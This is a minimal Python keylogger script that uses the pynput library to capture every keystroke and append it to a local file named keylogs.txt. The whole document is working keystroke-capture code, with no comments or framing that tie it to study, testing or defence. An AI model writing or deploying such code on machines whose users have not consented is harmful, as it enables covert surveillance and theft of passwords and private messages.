from pynput.keyboard import Listener

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        f.write(f'{key}')
        f.close()

with Listener(on_press=on_press) as listener:
    listener.join()